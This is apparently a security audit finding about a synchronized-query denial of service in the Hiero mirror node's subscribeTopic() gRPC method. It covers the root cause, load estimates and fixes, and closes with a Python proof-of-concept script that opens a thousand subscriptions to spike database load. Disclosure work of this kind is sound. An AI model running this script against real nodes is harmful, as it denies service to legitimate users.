### Title
Thundering Herd DoS via Synchronized Safety-Check DB Queries in `subscribeTopic()`

### Summary
Every call to `subscribeTopic()` schedules an unthrottled database query exactly 1 second after subscription via a hardcoded `Mono.delay(Duration.ofSeconds(1L))` with no jitter. Because there is no global limit on concurrent subscriptions and no per-IP rate limiting on the gRPC endpoint, an unprivileged attacker can open many simultaneous subscriptions and cause all safety-check DB queries to fire at a predictable, synchronized moment, spiking database load on demand.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 67–70, inside `subscribeTopic()`:

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

**Root cause — three failed assumptions:**

1. **Fixed delay, no jitter.** `Duration.ofSeconds(1L)` is hardcoded. All N subscriptions opened at time T will have their safety checks fire at T+1s simultaneously.

2. **`isComplete()` does not suppress the check for live subscriptions.** `isComplete()` returns `false` whenever `filter.getEndTime() == null` (lines 203–205). The most common subscription type (live, no end time) always passes the `!topicContext.isComplete()` guard, so the DB query always fires.

3. **The safety-check path uses unthrottled retrieval.** `missingMessages(topicContext, null)` calls `topicMessageRetriever.retrieve(gapFilter, false)` — the `false` flag selects the unthrottled path in `PollingTopicMessageRetriever`, which uses `maxPageSize=5000`, `maxPolls=12`, and `pollingFrequency=20ms` (lines 103–107 of `PollingTopicMessageRetriever.java`). Each safety-check trigger can issue up to 12 sequential DB queries.

**Why existing checks are insufficient:**

- `maxConcurrentCallsPerConnection = 5` (`NettyProperties`, line 14) limits calls **per TCP connection**, not total connections. An attacker opens many connections.
- `subscriberCount` (line 48) is a Micrometer gauge metric only — it enforces nothing.
- `Schedulers.boundedElastic()` has a default task queue of 100,000 entries. It serializes some execution but does not drop or reject tasks; all queued DB queries still execute, extending the spike duration rather than preventing it.
- There is no authentication, no per-IP rate limit, and no global subscription cap on the gRPC `subscribeTopic` endpoint.

### Impact Explanation

An attacker can cause a predictable, repeatable database load spike at will. With C connections × 5 calls/connection = 5C simultaneous subscriptions, at T+1s the server issues up to 5C × 12 = 60C unthrottled DB queries in rapid succession. At modest scale (e.g., 200 connections = 1,000 subscriptions = up to 12,000 DB queries in a ~240ms window), this can saturate the PostgreSQL connection pool, cause query timeouts for legitimate users, and degrade or deny service to all consumers of the mirror node gRPC API. The attack is repeatable: the attacker can disconnect and reconnect to re-trigger the spike on a schedule.

### Likelihood Explanation

No privileges, credentials, or special knowledge are required — only the ability to open gRPC connections to port 5600 and call `subscribeTopic` with any valid (or, if `checkTopicExists=false`, any) topic ID. The gRPC protocol is well-documented. The 1-second synchronization window is deterministic and requires no timing precision from the attacker. The attack is trivially scriptable with any gRPC client library.

### Recommendation

1. **Add jitter to the delay.** Replace `Duration.ofSeconds(1L)` with a randomized delay (e.g., `Duration.ofMillis(500 + ThreadLocalRandom.current().nextLong(1000))`) to desynchronize safety checks across subscriptions.
2. **Enforce a global concurrent-subscription limit.** Use `subscriberCount` (already tracked) to reject new subscriptions above a configurable threshold, returning `RESOURCE_EXHAUSTED` to the caller.
3. **Add per-IP or per-connection subscription rate limiting** at the gRPC interceptor layer, analogous to the `ThrottleManagerImpl` used in the web3 module.
4. **Gate the safety-check retrieval with the throttled path** (`retrieve(gapFilter, true)` instead of `false`) so it respects `maxPageSize` and `pollingFrequency` limits.

### Proof of Concept

```python
import grpc
import threading
import time
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 200   # 200 connections × 5 calls = 1000 subscriptions
CALLS_PER_CONN = 5

def subscribe(stub):
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # no consensusEndTime → isComplete() always False
    )
    try:
        for _ in stub.subscribeTopic(req):
            pass
    except Exception:
        pass

channels = [grpc.insecure_channel(TARGET) for _ in range(NUM_CONNECTIONS)]
stubs   = [consensus_service_pb2_grpc.ConsensusServiceStub(c) for c in channels]

threads = []
# Open all subscriptions simultaneously
for stub in stubs:
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=subscribe, args=(stub,))
        threads.append(t)

start = time.time()
for t in threads:
    t.start()

# At start+1s, all 1000 safety checks fire → up to 12,000 unthrottled DB queries
# Monitor DB with: SELECT count(*) FROM pg_stat_activity WHERE state='active';
```

Expected result: a sharp spike in `pg_stat_activity` active queries at approximately `start + 1.0s`, sustained for up to `12 × 20ms = 240ms` per wave, repeatable on reconnect.
